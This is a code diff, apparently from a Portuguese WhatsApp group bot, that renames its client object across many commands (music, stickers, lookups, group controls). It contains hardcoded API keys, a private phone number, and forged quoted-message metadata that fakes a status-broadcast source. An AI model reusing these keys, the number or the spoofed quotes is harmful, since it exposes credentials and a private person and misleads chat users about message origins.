+                    client.sendMessage(from, 'Lista de usuários online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, {
                         quoted: mek,
                         contextInfo: {
                             mentionedJid: online
@@ -3984,7 +3734,7 @@ case 'tourl':
                     if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                         ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                         reply('espere')
-                        owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+                        owgi = await client.downloadAndSaveMediaMessage(ger)
                         anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
                         imurl = `${anu.display_url}`
                         reply(imurl)
@@ -3993,12 +3743,12 @@ case 'tourl':
 //_CHANCES MOSTRA PORCENTAGEM DO QUE ESPECIFICAR
 case 'chance':
 if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-tomioka.updatePresence(from, Presence.composing) 
+client.updatePresence(from, Presence.composing) 
 var avb = body.slice(7)
-if (args.length < 1) return tomioka.sendMessage(from, `Você precisa digitar da forma correta\nExemplo: ${prefix}chance da vaca nao dar leite amanha`, text, {quoted: mek})
+if (args.length < 1) return client.sendMessage(from, `Você precisa digitar da forma correta\nExemplo: ${prefix}chance da vaca nao dar leite amanha`, text, {quoted: mek})
 random = `${Math.floor(Math.random() * 100)}`
 hasil = `A chance ${body.slice(7)}\n\né de... ${random}%`
-tomioka.sendMessage(from, hasil, text, {quoted: mek, contextInfo: {mentionedJid: [sender]}})
+client.sendMessage(from, hasil, text, {quoted: mek, contextInfo: {mentionedJid: [sender]}})
 break
 //_FOTOS SHITPOST
 case 'shiti':
@@ -4009,7 +3759,7 @@ jsonData = JSON.parse(data);
 randIndex = Math.floor(Math.random() * jsonData.length);
 randKey = jsonData[randIndex];
 buffer = await getBuffer(randKey.result)
-tomioka.sendMessage(from, buffer, image, {caption: 'aqui está:)', quoted: mek})
+client.sendMessage(from, buffer, image, {caption: 'aqui está:)', quoted: mek})
 break
 //_PLAQUINHAS
                   case 'pmake':
@@ -4021,7 +3771,7 @@ break
 					if (teks.length > 15) return fakegroup ('O texto é longo, até 15 caracteres')
 					reply('*Estou fazendo, se der erro tente novamente ✓*')
 					buffer = await getBuffer(`https://ubbornag.sirv.com/Screenshot_20210513-151821.png?text.0.text=${teks}&text.0.position.x=-40%25&text.0.position.y=-65%25&text.0.size=30&text.0.color=000000&text.0.opacity=53&text.0.font.family=Shadows%20Into%20Light%20Two&text.0.outline.blur=15`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, caption: 'Ta na mão 😈'})
+					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'Ta na mão 😈'})
 					break
                   case 'pmake2':
                   if (!isPremium) return fakegroup (mess.only.premium)
@@ -4031,7 +3781,7 @@ break
 					if (teks.length > 10) return fakegroup ('O texto é longo, até 10 caracteres')
 					reply('*Estou fazendo, se der erro tente novamente ✓*')
 					buffer = await getBuffer(`https://ighteede.sirv.com/pack%20plaquinha%20%2B18%20BY%20sombrio/pack%20plaquinha%20%2B18%20BY%20sombrio/Screenshot_2021-04-10-22-59-23-1.png?text.0.text=${teks}&text.0.position.x=-36%25&text.0.position.y=-39%25&text.0.size=23&text.0.color=000000&text.0.opacity=54&text.0.font.family=Shadows%20Into%20Light`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, caption: 'Toma ai 😈💅 '})
+					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'Toma ai 😈💅 '})
 					break
 case 'anagrama':
  if (!isUser) return reply(yag.rg(p))
@@ -4049,7 +3799,7 @@ case 'anagrama':
 				dica: ${dataAnagrama2.dica}
 				`)} else {
 					fs.writeFileSync(`./src/anagrama-${from}.json`, `${JSON.stringify(palavrasANA[anaaleatorio])}`)
-					tomioka.sendMessage(from, `
+					client.sendMessage(from, `
 ╭─────≽「 👾 ANAGRAMA 👾 」
 │➽ DESCUBRA A PALAVRA
 │➽ ANAGRAMA: ${palavrasANA[anaaleatorio].embaralhada}
@@ -4159,7 +3909,7 @@ case 'antidoc':
      
 break
 case 'infobot':
- temporlg = tomioka.prepareMessageFromContent(from,{
+ temporlg = client.prepareMessageFromContent(from,{
 "listMessage": {
 "title": "informações do bot",
 "description": "Clique nos botões baixo e envie",
@@ -4181,11 +3931,11 @@ case 'infobot':
 ]                    
 }
 }, {quoted:mek})
-tomioka.relayWAMessage(temporlg)
+client.relayWAMessage(temporlg)
 break
 case 'docu':
  tope = fs.readFileSync('./assets/primeiro_teste.html')
-tomioka.sendMessage(from, tope, MessageType.document, {mimetype: 'text/html', quoted: ftoko, filename: 'Tomioka.html'})
+client.sendMessage(from, tope, MessageType.document, {mimetype: 'text/html', quoted: ftoko ,contextInfo: tomis, filename: 'Tomioka.html'})
 break
 case 'anticontato':
  
@@ -4233,24 +3983,24 @@ break
 //_RANKS E %
 case '%f':
 if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-tomioka.updatePresence(from, Presence.composing) 
+client.updatePresence(from, Presence.composing) 
 var avb = body.slice(7)
 random = `${Math.floor(Math.random() * 100)}`
 hasil = `  ${body.slice(7)}\n\      ${random}% `
-tomioka.sendMessage(from, hasil, text, {quoted: mek, contextInfo: {mentionedJid: [sender]}})
+client.sendMessage(from, hasil, text, {quoted: mek, contextInfo: {mentionedJid: [sender]}})
 break
 case '%b':
 if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-tomioka.updatePresence(from, Presence.composing) 
+client.updatePresence(from, Presence.composing) 
 var avb = body.slice(7)
 random = `${Math.floor(Math.random() * 100)}`
 hasil = `  ${body.slice(7)}\n\      ${random}% `
-tomioka.sendMessage(from, hasil, text, {quoted: mek, contextInfo: {mentionedJid: [sender]}})
+client.sendMessage(from, hasil, text, {quoted: mek, contextInfo: {mentionedJid: [sender]}})
 break
 //_COMANDOS ABRIR FECHAR GRUPO
 case 'abrir':
 if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-tomioka.updatePresence(from, Presence.composing)
+client.updatePresence(from, Presence.composing)
 if (!isGroup) return fakegroup (ptbr.group())
 if (!isGroupAdmins) return fakegroup (ptbr.admin())
 if (!isBotGroupAdmins) return fakegroup (ptbr.Badmin())
@@ -4260,14 +4010,14 @@ open = {
 mentionedJid: [sender]
   }
 }
-tomioka.groupSettingChange (from, GroupSettingChange.messageSend, false)
-tomioka.sendMessage(from, open, text, {
+client.groupSettingChange (from, GroupSettingChange.messageSend, false)
+client.sendMessage(from, open, text, {
   quoted: mek
 })
 break
 case 'fechar':
                     if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-					tomioka.updatePresence(from, Presence.composing) 
+					client.updatePresence(from, Presence.composing) 
 					if (!isGroup) return fakegroup (mess.only.group)
 					if (!isGroupAdmins) return fakegroup (mess.only.admin)
 					if (!isBotGroupAdmins) return fakegroup (mess.only.Badmin)
@@ -4276,18 +4026,18 @@ case 'fechar':
 					text: `Grupo fechado pelo administrador @${nomor.split("@s.whatsapp.net")[0]}\nsekarang *apenas administrador* quem pode enviar mensagens`,
 					contextInfo: { mentionedJid: [nomor] }
 					}
-					tomioka.groupSettingChange (from, GroupSettingChange.messageSend, true);
+					client.groupSettingChange (from, GroupSettingChange.messageSend, true);
 					reply(close)
 					break
 case 'togif': 
 if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-if ((isMedia && !tomioka.message.videoMessage || isQuotedSticker) && args.length == 0) {
+if ((isMedia && !client.message.videoMessage || isQuotedSticker) && args.length == 0) {
 const encmediaaa = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
-const mediaaa = await tomioka.downloadAndSaveMediaMessage(encmediaaa)
+const mediaaa = await client.downloadAndSaveMediaMessage(encmediaaa)
 reply("⏳Aguarde alguns instantes...⏳\n\nA seu gif será enviada em até 2 minutos\nCaso não envie, mande novamente ;)")
 a = await webp2gifFile(mediaaa)
 mp4 = await getBuffer(a.result)
-tomioka.sendMessage(from, mp4, MessageType.video, {mimetype: 'video/gif', filename: `stick.gif`, quoted: mek, caption: '✅'})
+client.sendMessage(from, mp4, MessageType.video, {mimetype: 'video/gif', filename: `stick.gif`, quoted: mek, caption: '✅'})
 fs.unlinkSync(mediaaa)
 }
 break  
@@ -4304,7 +4054,7 @@ imageToBase64(res.data.url)
 var buf = Buffer.from(ress, 'base64')
 a = webp2gifFile(buf)
 mp4 = getBuffer(a.result)
-tomioka.sendMessage(from, mp4, MessageType.video, {mimetype: 'video/gif', filename: `stick.gif`, quoted: mek, caption: '✅'})
+client.sendMessage(from, mp4, MessageType.video, {mimetype: 'video/gif', filename: `stick.gif`, quoted: mek, caption: '✅'})
 })
 })
 } catch (e) {
@@ -4316,7 +4066,7 @@ var imgbb = require('imgbb-uploader')
 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
 reply('espere')
-owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+owgi = await client.downloadAndSaveMediaMessage(ger)
 anu = await imgbb("0c419be2e8bfc27eff00147b0c763418", owgi)
 imurl = `${anu.display_url}`
 reply(imurl)
@@ -4332,33 +4082,20 @@ ccg =
   ‣ Cep: ${hehe.cep}
   ‣ Estado: ${hehe.state}
   ‣ Cidade: ${hehe.city}`
-tomioka.sendMessage(from, ccg, text, {quoted:mek})
+client.sendMessage(from, ccg, text, {quoted:mek})
 break
-
-/*case 'ddd':
-if (args.length < 1) return fakegroup ('digite o ddd que deseja buscar')
-ddd = body.slice(4)
-hehe = await fetchJson(`https://brasilapi.com.br/api/ddd/v1/${ddd}`)
-if (hehe.error) return fakegroup (hehe.error)
-ccg =
-` INFORMAÇÕES DO DDD
-  ‣ Estado: ${hehe.state}
-  ‣ Cidades: 
-    ${hehe.cities}\n`
-tomioka.sendMessage(from, ccg, text, {quoted:mek})
-break*/
 case 'convite':
 if (args.length < 0) return fakegroup ('Digite o link do grupo ')
 var codeInvite = body.slice(9).split('https://chat.whatsapp.com/')[1]
  if (!codeInvite) return fakegroup ('certifique-se de que o link está correto! ')                 
- if (args.length > 300) return tomioka.sendMessage(from, 'Máximo 300 caracteres', msgType.text, {quoted: mek})
+ if (args.length > 300) return client.sendMessage(from, 'Máximo 300 caracteres', msgType.text, {quoted: mek})
 var nomor = mek.participant
 teks1 = `[CONVITE]\nDe: wa.me/${sender.split("@s.whatsapp.net")[0]}\nLink: ${body.slice(9)}`
 var options = {
  text: teks1, 
 contextInfo: {mentionedJid: [sender]}, 
 }
-tomioka.sendMessage('554498220867@s.whatsapp.net', options, text, {quoted: mek})
+client.sendMessage('554498220867@s.whatsapp.net', options, text, {quoted: mek})
 reply("O seu convite foi enviado ao meu dono e esta em analise; Spam = block + ban.")
 break
 case 'ddd':
@@ -4372,12 +4109,12 @@ luc4rio3 =
 ⧴ 〘 CIDADES 〙 : ${luc4rio2.Cidades}
 ⧴ 〘 ESTADO 〙 : ${luc4rio2.Estado}
 〘 ${luc4rio2.Mensagem} 〙\n\nNÃO E POSSÍVEL PUXA CONSULTA DE TELEFONE\n\nBY : TioTomioka`
-tomioka.sendMessage(from, luc4rio3, text, {quoted: mek})
+client.sendMessage(from, luc4rio3, text, {quoted: mek})
 break			
 case 'infome':
 case 'eu':
 try {
-         var ppimg = await tomioka.getProfilePicture(`${sender.split('@')[0]}@c.us`)
+         var ppimg = await client.getProfilePicture(`${sender.split('@')[0]}@c.us`)
             } catch {
                var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
             }
@@ -4415,11 +4152,11 @@ hisil = `
 ➻ CONSELHO :
 ${conselho}
 `
-tomioka.sendMessage(from, buffer, image, {caption: hisil,quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
+client.sendMessage(from, buffer, image, {caption: hisil,quoted: ftoko ,contextInfo: tomis, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
 break
 case 'traduzir': //@SUPRA â™¡
  if (args.length < 1) return fakegroup ('Insira o texto que vocÃª deseja traduzir')
- tomioka.updatePresence(from, Presence.composing)
+ client.updatePresence(from, Presence.composing)
  tels = body.slice(10)
  try {
  anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/translate?text=${tels}&from=id&to=pt`, {
@@ -4444,9 +4181,9 @@ case 'simbolos':
 				if (anu.error) return fakegroup (anu.error)
 				infomp3 = `𝐂𝐨𝐧??𝐚 ??𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐝𝐚\n❗MUSÍCA ENCONTRADA\n[❗] enviando sua música aguarde..`				
 			    buffer = await getBuffer(`https://api-exteam.herokuapp.com/api/card-spotify?titulo=${encodeURIComponent(anu.result.title)}&author=${encodeURIComponent(anu.result.source)}&album=TOMIOKA-BOT&capa=${anu.result.thumbnail}`)
-				tomioka.sendMessage(from, buffer, image, {quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": infomp3, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})					
+				client.sendMessage(from, buffer, image, {quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": infomp3, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})					
                 msc = await getBuffer(anu.result.url_audio)				
-				tomioka.sendMessage(from, msc, audio, {mimetype: 'audio/mp4', filename: `tomioka-bot.mp3`, contextInfo: null, quoted: ftoko})
+				client.sendMessage(from, msc, audio, {mimetype: 'audio/mp4', filename: `tomioka-bot.mp3`, contextInfo: null, quoted: ftoko ,contextInfo: tomis})
 				break
 case 'play1':
 reply (mess.wait)
@@ -4457,8 +4194,8 @@ buffer2 = await getBuffer(musica.result.dl_link)
 teks =`𝚈𝚘??𝚝𝚞𝚋𝚎 𝙿𝚕𝚊𝚢 𝙼𝚞𝚜𝚒𝚌
 𝚄𝚜𝚞𝚊́𝚛𝚒𝚘 @${sender.split("@")[0]}
 𝚝𝚒𝚝𝚞𝚕𝚘 ${musica.result.title}`
-tomioka.sendMessage(from, buffer1, image, {quoted: mek, caption: teks })
-tomioka.sendMessage(from, buffer2, MessageType.audio, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "꧁𝕋𝕆𝕄𝕀𝕆𝕂??~𝔹𝕆𝕋꧂", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./assets/botlogo.webp')} } }, caption: "<//>" })
+client.sendMessage(from, buffer1, image, {quoted: mek, caption: teks })
+client.sendMessage(from, buffer2, MessageType.audio, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "꧁𝕋𝕆𝕄𝕀𝕆𝕂??~𝔹𝕆𝕋꧂", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./assets/botlogo.webp')} } }, caption: "<//>" })
                 break
                case 'play2':
                
@@ -4470,8 +4207,8 @@ if (args.length < 1) return fakegroup ('Digite o nome da música')
          msg = ('Musica encontrada enviando...\nFonte:YouTube ')
                 buffer = await getBuffer(anu.thumb)
                 lagu = await getBuffer(anu.url)
-                tomioka.sendMessage(from, buffer, image, {quoted: mek, caption: msg})
-                tomioka.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', ptt:true})
+                client.sendMessage(from, buffer, image, {quoted: mek, caption: msg})
+                client.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', ptt:true})
                 break
                 case 'play3':
 if (args.length < 1) return fakegroup ('Digite o nome da música')
@@ -4479,7 +4216,7 @@ play = body.slice(6)
 reply('Procurando sua música...⏳')
 anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp4?apikey=tiotomioka&q=jatuh%20jadi%20resah`)
 if (anu.message) return fakegroup ('Música não encontrada...\nTente específicar o nome dela.')
-//aanu = await fetchJson(`https://api-tomioka.italuh.repl.co/api/yta?url=${anu.result.source}`)
+//aanu = await fetchJson(`https://api-client.italuh.repl.co/api/yta?url=${anu.result.source}`)
 aanu = await fetchJson(`https://api-exteam.herokuapp.com/api/yt/playmp3?query=${play}&apikey=estreia`)
 infomp3 = 
 `    MÚSICA ENCONTRADA
@@ -4489,10 +4226,10 @@ buffer = await getBuffer(anu.result.thumbnail)
 //lagu = await getBuffer(anu.result.url_audio)
 lagu = await getBuffer(aanu.url)
 setTimeout( () => {
-tomioka.sendMessage(from, buffer, image, {quoted: mek, caption: infomp3})
+client.sendMessage(from, buffer, image, {quoted: mek, caption: infomp3})
 }, 1500)
 reply('Baixando e enviando sua música...')
-tomioka.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', quoted: mek})
+client.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', quoted: mek})
 break
 case 'play4':
 if (args.length < 1) return fakegroup ('Digite o link da música')
@@ -4503,8 +4240,8 @@ anu = await fetchJson(`https://enolaholmes.herokuapp.com/api/yutub/audio?url=${p
 info2 = 'MUSICA ENCONTRADA!!!\nFonte:YouTube\nJa estou te enviando sua musica...'
 buffer = await getBuffer(anu.result.thumb)
 lagu = await getBuffer(anu.result.result)
-tomioka.sendMessage(from, buffer, image, {quoted: mek, caption: info2})
-                tomioka.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', filename: `${anu.result.title}.mp3`, quoted: mek})
+client.sendMessage(from, buffer, image, {quoted: mek, caption: info2})
+                client.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', filename: `${anu.result.title}.mp3`, quoted: mek})
                 
                 break
 case 'play5':
@@ -4513,15 +4250,15 @@ anu = await fetchJson('https://luc4rio.herokuapp.com/api/social/play/audio?video
 Info = '${anu.Mensagem}\nTitulo ${anu.Titulo_Encontrado} Duração ${anu.Duracao_Do_Video}Fonte ${Link_Do_Video}'
 buffer = await getBuffer(anu.Imagem_Do_Video)
 lagu = await getBuffer(anu.Link_De_Download)
-tomioka.sendMessage(from, buffer, image, {quoted: mek,caption:info})
-tomioka.sendMessage(from, lagu, audio, {mimetype:'audio/mp4',filename: '${anu.Titulo_Encontrado}.mp3' , quoted: mek})
+client.sendMessage(from, buffer, image, {quoted: mek,caption:info})
+client.sendMessage(from, lagu, audio, {mimetype:'audio/mp4',filename: '${anu.Titulo_Encontrado}.mp3' , quoted: mek})
 break
 case  'play6':
 teks = body.slice(5)
 krat4ss = await fetchJson (`https://api.zeks.xyz/api/ytplaymp4?apikey=apivinz&q=jatuh%20jadi%20resah`)
 kratos = await getBuffer(krat4ss.resultado.audio)
 reply('Enviando Aguarde')
-tomioka.sendMessage(from, kratos, audio, {quoted: mek})
+client.sendMessage(from, kratos, audio, {quoted: mek})
 break
 //playe tomiokaa
 case 'playe':   
@@ -4534,9 +4271,9 @@ case 'playe':
 				if (anu.error) return fakegroup (anu.error)
 				infomp3 = `𝐂𝐨𝐧𝐭𝐚 𝐕𝐞𝐫𝐢𝐟𝐢𝐜𝐚????\n❗MUSÍCA ENCONTRADA\n[❗] enviando sua música aguarde..`				
 			    buffer = await getBuffer(`https://api-exteam.herokuapp.com/api/card-spotify?titulo=${encodeURIComponent(anu.result.title)}&author=${encodeURIComponent(anu.result.source)}&album=TOMIOKA-BOT&capa=${anu.result.thumbnail}`)
-				tomioka.sendMessage(from, buffer, image, {quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": infomp3, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})					
+				client.sendMessage(from, buffer, image, {quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": infomp3, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})					
                 msc = await getBuffer(anu.result.url_audio)				
-				tomioka.sendMessage(from, msc, audio, {mimetype: 'audio/mp4', filename: `tomioka-bot.mp3`, contextInfo: null, quoted: ftoko})
+				client.sendMessage(from, msc, audio, {mimetype: 'audio/mp4', filename: `tomioka-bot.mp3`, contextInfo: null, quoted: ftoko ,contextInfo: tomis})
 				break
 					case 'dado2':
 					if (!isPremium) return fakegroup (mess.only.premium)
@@ -4544,7 +4281,7 @@ if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando
 const dadus = ["⚀","⚁","⚂","⚃","⚄","⚅"]
 dadu = dadus[Math.floor(Math.random() * dadus.length)]
 dador = fs.readFileSync('./database/dados/'+dadu+'.webp')
-tomioka.sendMessage(from, dador, sticker, {quoted: mek})
+client.sendMessage(from, dador, sticker, {quoted: mek})
 break
 case 'gerarnick': 
 if (!isPremium) return fakegroup (mess.only.premium)
@@ -4578,7 +4315,7 @@ teks = ` 🧙🏻‍♂️NICKS GERADOS COM SUCESSO!🧙🏻‍♂️
     
     ©ᬊ⃔⃕͜ 亇ł❍ 亇❍ᛖł❍Ҡ么↯愛
  `
-tomioka.sendMessage(from, teks, text, {quoted: mek})
+client.sendMessage(from, teks, text, {quoted: mek})
 break
 case 'getpic':
 
@@ -4591,21 +4328,21 @@ if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando
 
 						try {
 
-						pp = await tomioka.getProfilePicture(mentioned)
+						pp = await client.getProfilePicture(mentioned)
 
 						buffer = await getBuffer(pp)
 
 						
 
-//					tomioka.sendMessage(from, buffer, image, {quoted: mek, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
+//					client.sendMessage(from, buffer, image, {quoted: mek, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
 
-				 tomioka.sendMessage(from, { name: ``,address: ``,jpegThumbnail: buffer }, MessageType.location)
+				 client.sendMessage(from, { name: ``,address: ``,jpegThumbnail: buffer }, MessageType.location)
 
 					} catch (e) {
 
-//					await tomioka.sendMessage(from, buffer, image, {quoted: mek, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
+//					await client.sendMessage(from, buffer, image, {quoted: mek, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
 
-					 tomioka.sendMessage(from, { name: ``,address: ``,jpegThumbnail: buffer }, MessageType.location)
+					 client.sendMessage(from, { name: ``,address: ``,jpegThumbnail: buffer }, MessageType.location)
 
 					}
 
@@ -4614,8 +4351,8 @@ if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando
 break
 case 'tts': 
                     		if (!isGroup) return fakegroup (`[❗] *Olá ${pushname} para poder usar os comandos do bot entre nesse grupo:*\n\n➻ *GRUPO 1* = ${grupo1}`)
-				    if (args.length < 1) return tomioka.sendMessage(from, 'O Código de idioma e obrigatório!!', text, {quoted: mek})					 
-					if (args.length < 2) return tomioka.sendMessage(from, 'Cadê o texto?', text, {quoted: mek})
+				    if (args.length < 1) return client.sendMessage(from, 'O Código de idioma e obrigatório!!', text, {quoted: mek})					 
+					if (args.length < 2) return client.sendMessage(from, 'Cadê o texto?', text, {quoted: mek})
 					dtt = body.slice(8)
 					const gtts = require('./lib/gtts')(args[0])
 					ranm = getRandom('.mp3')
@@ -4627,7 +4364,7 @@ case 'tts':
 					fs.unlinkSync(ranm)
 					buffer = fs.readFileSync(rano)
 					if (err) return fakegroup ('ERROR')
-					tomioka.sendMessage(from, buffer, audio, {ptt:true, quoted:mek})
+					client.sendMessage(from, buffer, audio, {ptt:true, quoted:mek})
 					fs.unlinkSync(rano)
 					})
 					})
@@ -4641,10 +4378,10 @@ txt = args.join(' ')
 pack = txt.split('/')[0]
 autor = txt.split('/')[1]
 fig_mencionada = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
-fig_salvar = await tomioka.downloadMediaMessage(fig_mencionada)
+fig_salvar = await client.downloadMediaMessage(fig_mencionada)
 fs.writeFileSync('./tomioka.webp', fig_salvar)
 const figenviar = await createSticker('./tomioka.webp', {type: 'full', pack: `${pack}`, author: `${autor}`, categories: ['🌹']})
-tomioka.sendMessage(from, figenviar, sticker)
+client.sendMessage(from, figenviar, sticker)
 break
 case 'pucep':
 if (!isPremium) return fakegroup (mess.only.premium)
@@ -4661,14 +4398,14 @@ Estado ${send.resultado.uf}
 DDD ${send.resultado.ddd}   
                     
  `
-tomioka.sendMessage(from, teks, text, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('kk/sticker/botlogo.webp')}}}})
+client.sendMessage(from, teks, text, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('kk/sticker/botlogo.webp')}}}})
 break
 case 'wikipedia':
      if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
 	 teks = body.slice(11)
 	send = await fetchJson(`https://api-exteam.herokuapp.com/api/info/wikipedia?search=${teks}&apikey=pip`)
 	teks = ` ${send.result.result}`
-	tomioka.sendMessage(from, teks, text, {quoted: mek})
+	client.sendMessage(from, teks, text, {quoted: mek})
 	break
 //github
 case 'gitdobot':
@@ -4758,7 +4495,7 @@ https://www.mediafire.com/download/1zoqguo9x5zkapx
 
 =====≠≠========≠≠===============
 `
-tomioka.sendMessage(from, texto, text, {contextInfo: null})
+client.sendMessage(from, texto, text, {contextInfo: null})
 break
 //_ATTPs	
 case 'ttp': //BY SAYO
@@ -4777,18 +4514,19 @@ const fonte = ["Days%20One","Domine","Exo","Fredoka%20One","Gentium%20Basic","Gl
 
